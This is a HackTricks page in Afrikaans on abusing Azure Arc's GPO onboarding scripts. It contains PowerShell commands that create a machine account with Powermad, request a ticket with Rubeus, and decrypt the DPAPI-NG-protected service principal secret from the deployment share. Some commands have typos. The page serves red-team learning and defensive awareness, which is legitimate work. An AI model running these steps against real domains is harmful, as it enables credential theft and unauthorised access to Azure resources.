# Az - Azure Arc Kwesbare GPO Implementering Skrip

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

### Identifisering van die Probleme

Azure Arc maak die integrasie van nuwe interne bedieners (aangeslote domeinbedieners) in Azure Arc moontlik deur die Groepbeleidsvoorwerp-metode. Om dit te fasiliteer, voorsien Microsoft 'n implementeringshulpmiddel wat nodig is om die aanboordprosedure te begin. Binne die ArcEnableServerGroupPolicy.zip-l√™er kan die volgende skripte gevind word: DeployGPO.ps1, EnableAzureArc.ps1, en AzureArcDeployment.psm1.

Wanneer uitgevoer, voer die DeployGPO.ps1-skrip die volgende aksies uit:

1. Skep die Azure Arc Bedieners Aanboord GPO binne die plaaslike domein.
2. Kopieer die EnableAzureArc.ps1 aanboordskrip na die aangewese netwerk-aandeel wat geskep is vir die aanboordproses, wat ook die Windows-installeerpakket bevat.

Wanneer hierdie skrip uitgevoer word, moet stelseladministrateurs twee hoofparameters voorsien: **ServicePrincipalId** en **ServicePrincipalClientSecret**. Daarbenewens vereis dit ander parameters soos die domein, die FQDN van die bediener wat die aandeel huisves, en die aandeelnaam. Verdere besonderhede soos die huurder-ID, hulpbrongroep, en ander nodige inligting moet ook aan die skrip voorsien word.

'n Versleutelde geheim word gegenereer in die AzureArcDeploy-gids op die gespesifiseerde aandeel deur DPAPI-NG-versleuteling te gebruik. Die versleutelde geheim word gestoor in 'n l√™er met die naam encryptedServicePrincipalSecret. Bewyse hiervan kan gevind word in die DeployGPO.ps1-skrip, waar die versleuteling uitgevoer word deur ProtectBase64 met $descriptor en $ServicePrincipalSecret as insette te roep. Die beskrywer bestaan uit die Domeinrekenaar en Domeinbeheerder-groep-SID's, wat verseker dat die ServicePrincipalSecret slegs deur die Domeinbeheerders en Domeinrekenaars sekerheidsgroepe ontsluit kan word, soos aangedui in die skripskommentaar.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Uitbuiting

Ons het die volgende toestande:

1. Ons het suksesvol die interne netwerk binne gedring.
2. Ons het die vermo√´ om 'n rekenaarrekening binne Active Directory te skep of oor te neem.
3. Ons het 'n netwerk-aandeel ontdek wat die AzureArcDeploy-gids bevat.

Daar is verskeie metodes om 'n rekenaarrekening binne 'n AD-omgewing te verkry. Een van die mees algemene is om die rekenaarrekening kwota uit te buit. 'n Ander metode behels die kompromittering van 'n rekenaarrekening deur kwesbare ACL's of verskeie ander verkeerde konfigurasies.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Sodra 'n masjienrekening verkry is, is dit moontlik om te verifieer met behulp van hierdie rekening. Ons kan die runas.exe bevel met die netonly vlag gebruik of pass-the-ticket met Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Deur die TGT vir ons rekenaarrekening in die geheue gestoor te h√™, kan ons die volgende skrips gebruik om die dienshoofgeheim te dekodeer.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternatiewelik kan ons [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG) gebruik.

Op hierdie punt kan ons die oorblywende inligting wat nodig is om met Azure te verbind vanuit die ArcInfo.json-l√™er, wat op dieselfde netwerk-aandeel as die encryptedServicePrincipalSecret-l√™er gestoor word, versamel. Hierdie l√™er bevat besonderhede soos: TenantId, servicePrincipalClientId, ResourceGroup, en meer. Met hierdie inligting kan ons Azure CLI gebruik om as die gekompromitteerde diensprinsipaal te verifieer.

## Verwysings

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Azure-Arc/)
